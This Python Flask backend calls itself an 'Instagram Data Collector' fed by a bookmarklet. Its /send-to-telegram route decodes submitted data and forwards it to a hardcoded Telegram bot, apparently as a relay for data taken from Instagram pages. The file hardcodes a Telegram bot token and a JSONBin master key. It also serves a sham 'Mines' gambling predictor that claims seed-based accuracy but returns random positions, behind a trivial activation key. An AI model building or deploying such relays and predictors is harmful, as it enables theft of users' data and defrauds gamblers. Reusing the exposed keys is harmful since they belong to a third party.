from flask import Flask, request, jsonify
from flask_cors import CORS
import random
import re
import json
from datetime import datetime
import base64
import json
import requests

app = Flask(__name__)
CORS(app)  # This will enable CORS for all routes

# Telegram bot credentials
TELEGRAM_BOT_TOKEN = "7277931286:AAGRCmzEd8CSvMP-UGY10FrmrBgKQ66MSHc"
TELEGRAM_CHAT_ID = "5758343460"

# These would be environment variables in PythonAnywhere
JSONBIN_API_KEY = '$2a$10$QaLLaQQYaGAwjqpJssspeOyV90B7Bjok/82VOCBwJehrNWfqkgYSK'
JSONBIN_BIN_ID = '6868c4218a456b7966bba59e'
JSONBIN_API_URL = f'https://api.jsonbin.io/v3/b/{JSONBIN_BIN_ID}'


def get_reviews():
    headers = {
        "X-Master-Key": JSONBIN_API_KEY
    }
    try:
        response = requests.get(JSONBIN_API_URL, headers=headers)
        if response.ok:
            return response.json()["record"].get("reviews", [])
        return []
    except Exception as e:
        print(f"Error fetching reviews: {e}")
        return []

def save_reviews(reviews):
    headers = {
        "X-Master-Key": JSONBIN_API_KEY,
        "Content-Type": "application/json"
    }
    data = {"reviews": reviews}
    try:
        response = requests.put(JSONBIN_API_URL, headers=headers, json=data)
        return response.ok
    except Exception as e:
        print(f"Error saving reviews: {e}")
        return False

@app.route('/api/fetch-reviews', methods=['GET'])
def fetch_reviews():
    reviews = get_reviews()
    return jsonify({"reviews": reviews})

@app.route('/api/submit-review', methods=['POST'])
def submit_review():
    try:
        review_data = request.json
        reviews = get_reviews()

        # Add additional fields
        review_data["approved"] = False
        review_data["rejected"] = False
        review_data["date"] = datetime.now().isoformat()

        reviews.append(review_data)

        if save_reviews(reviews):
            return jsonify({"status": "success", "message": "Review submitted successfully"})
        else:
            return jsonify({"status": "error", "message": "Failed to save review"}), 500

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/update-review-status', methods=['POST'])
def update_review_status():
    try:
        data = request.json
        review_id = data.get('reviewId')
        approve = data.get('approve', False)
        rejected = data.get('rejected', False)

        if not review_id:
            return jsonify({"status": "error", "message": "Review ID is required"}), 400

        reviews = get_reviews()
        review_found = False

        for review in reviews:
            if review.get('id') == review_id:
                review['approved'] = approve
                review['rejected'] = rejected
                review_found = True
                break

        if not review_found:
            return jsonify({"status": "error", "message": "Review not found"}), 404

        if save_reviews(reviews):
            return jsonify({
                "status": "success",
                "message": f"Review {'approved' if approve else 'rejected'} successfully"
            })
        else:
            return jsonify({"status": "error", "message": "Failed to update review"}), 500

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/delete-review', methods=['POST'])
def delete_review():
    try:
        data = request.json
        review_id = data.get('reviewId')

        if not review_id:
            return jsonify({"status": "error", "message": "Review ID is required"}), 400

        reviews = get_reviews()
        reviews = [r for r in reviews if r.get('id') != review_id]

        if save_reviews(reviews):
            return jsonify({"status": "success", "message": "Review deleted successfully"})
        else:
            return jsonify({"status": "error", "message": "Failed to delete review"}), 500

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/send-to-telegram', methods=['POST', 'GET'])
def send_to_telegram():
    try:
        # Handle GET requests with data parameter
        if request.method == 'GET':
            encoded_data = request.args.get('data', '')
            if encoded_data:
                try:
                    # Decode from base64
                    message = base64.b64decode(encoded_data).decode('utf-8')
                except:
                    message = 'Failed to decode data'
            else:
                message = 'No data provided in GET request'
        # Handle POST requests (JSON)
        else:
            try:
                data = request.get_json()
                message = data.get('message', 'No data provided in POST request')
            except:
                message = request.form.get('message', 'No data provided in form')

        # Send to Telegram
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "Markdown"
            }
        )

        # Check if the message was sent successfully
        if response.status_code == 200:
            if request.method == 'GET':
                return """
                <html>
                <head>
                    <title>Success</title>
                    <style>
                        body {
                            font-family: Arial, sans-serif;
                            text-align: center;
                            padding-top: 50px;
                            background-color: #f0f2f5;
                        }
                        .success {
                            color: white;
                            background-color: #4CAF50;
                            padding: 20px;
                            border-radius: 5px;
                            display: inline-block;
                        }
                    </style>
                </head>
                <body>
                    <div class="success">Data sent to Telegram successfully!</div>
                </body>
                </html>
                """
            else:
                return jsonify({"status": "success", "message": "Data sent to Telegram successfully"})
        else:
            if request.method == 'GET':
                return f"Error: {response.text}", 500
            else:
                return jsonify({"status": "error", "message": f"Failed to send to Telegram: {response.text}"}), 500

    except Exception as e:
        if request.method == 'GET':
            return f"Error: {str(e)}", 500
        else:
            return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def index():
    return """
    <html>
    <head>
        <title>Instagram Data Collector Backend</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 800px;
                margin: 0 auto;
                padding: 20px;
                line-height: 1.6;
            }
            h1 {
                color: #0095f6;
            }
            .info {
                background-color: #f0f2f5;
                border-left: 4px solid #0095f6;
                padding: 15px;
                margin: 20px 0;
            }
        </style>
    </head>
    <body>
        <h1>Instagram Data Collector Backend</h1>
        <div class="info">
            <p>This service is running. Use the bookmarklet to send Instagram data.</p>
            <p>For more information, refer to the README.md file.</p>
        </div>
    </body>
    </html>
    """
@app.route('/get-positions', methods=['GET'])
def get_positions():
    # Create a list of all possible positions (0-24)
    positions = list(range(25))

    # Randomly shuffle the positions
    random.shuffle(positions)

    # Take first 3 positions for diamonds
    diamond_positions = positions[:3]

    # All remaining positions will be bombs
    bomb_positions = positions[3:]

    return jsonify({
        "status": "success",
        "diamonds": diamond_positions,
        "bombs": bomb_positions
    })

@app.route('/validate_seed', methods=['POST'])
def validate_seed():
    data = request.json
    seed = data.get('server_seed')
    original_seed = data.get('original_seed', '')  # Optional field to check for tampering

    # Basic validation
    if not seed or len(seed) != 64:
        return jsonify({"valid": False, "error": "Server seed must be exactly 64 characters long"}), 400

    # Check for hexadecimal format (only 0-9, a-f characters allowed)
    if not all(c in "0123456789abcdef" for c in seed.lower()):
        return jsonify({"valid": False, "error": "Server seed must contain only hexadecimal characters (0-9, a-f)"}), 400

    # Check for minimum number of letters and digits
    letters = sum(c.isalpha() for c in seed)
    digits = sum(c.isdigit() for c in seed)

    if letters < 12:
        return jsonify({"valid": False, "error": "Server seed must contain at least 12 letters"}), 400

    if digits < 12:
        return jsonify({"valid": False, "error": "Server seed must contain at least 12 digits"}), 400

    # Check distribution - ensure seed has a good mix throughout
    # Divide the seed into 4 parts and verify each part has both letters and digits
    chunk_size = len(seed) // 4
    for i in range(4):
        chunk = seed[i * chunk_size:(i + 1) * chunk_size]
        chunk_letters = sum(c.isalpha() for c in chunk)
        chunk_digits = sum(c.isdigit() for c in chunk)

        if chunk_letters < 3 or chunk_digits < 3:
            return jsonify({"valid": False, "error": "Server seed must have a good distribution of letters and digits throughout"}), 400

    # Check if first 10-12 characters have been modified (if original seed is provided)
    if original_seed and len(original_seed) == 64:
        if not original_seed.startswith(seed[:12]) and not seed.startswith(original_seed[:12]):
            return jsonify({"valid": False, "error": "Beginning of server seed appears to be tampered with"}), 400

    # Check for patterns that might indicate manipulation
    # Prevent simple substitutions like replacing start with common words/numbers
    common_substitutions = ["hello", "1234567890", "abcdefghij", "test", "admin"]
    for sub in common_substitutions:
        # Check if any common substitution exists at the beginning of the seed
        if any(seed.lower().startswith(sub[0:min(len(sub), j)] + seed[j:j+min(12-len(sub), len(sub))])
               for j in range(1, 12)):
            return jsonify({"valid": False, "error": "Server seed contains suspicious patterns"}), 400

    # Check for entropy - no long sequences of the same character
    for i in range(len(seed) - 4):
        if len(set(seed[i:i+5])) <= 2:  # If 5 consecutive chars have 2 or fewer unique chars
            return jsonify({"valid": False, "error": "Server seed must have sufficient randomness"}), 400

    # Analyze the sample seeds to extract more validation rules
    # Looking at the samples, they all have good distribution of hex characters

    # Successful validation
    return jsonify({
        "valid": True,
        "message": "Server seed is valid",
        "analysis": {
            "length": len(seed),
            "letters": letters,
            "digits": digits,
            "hex_format": "valid"
        }
    }), 200

def validate_server_seed(seed):
    if len(seed) != 64:
        return False
    letters = len(re.findall(r'[a-zA-Z]', seed))
    digits = len(re.findall(r'\d', seed))
    return letters >= 10 and digits >= 10

def shuffle(array):
    for i in range(len(array) - 1, 0, -1):
        j = random.randint(0, i)
        array[i], array[j] = array[j], array[i]
    return array

@app.route('/generate_pattern', methods=['POST'])
def generate_pattern():
    data = request.json
    server_seed = data.get('server_seed')
    client_seed = data.get('client_seed')
    accuracy = data.get('accuracy')

    if not validate_server_seed(server_seed):
        return jsonify({"error": "Invalid server seed. Please enter a 64-character seed with at least 10 letters and 10 digits."}), 400

    if len(client_seed) != 10:
        return jsonify({"error": "Invalid Client seed. Please enter a 10-character seed."}), 400

    positions = list(range(25))
    shuffle(positions)

    if accuracy == "60":
        diamond_count = random.randint(1, 4)
    elif accuracy == "95":
        diamond_count = 3
    elif accuracy == "stable":
        diamond_count = 8
    else:
        return jsonify({"error": "Invalid accuracy value."}), 400

    diamonds = positions[:diamond_count]
    bombs = positions[diamond_count:]

    return jsonify({
        "diamonds": diamonds,
        "bombs": bombs
    })

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    valid_key = "1"
    user_key = data.get('activation_key')

    if user_key == valid_key:
        return jsonify({"message": "Logged in successfully!"}), 200
    else:
        return jsonify({"error": "Invalid key!"}), 401

if __name__ == '__main__':
    app.run(debug=True)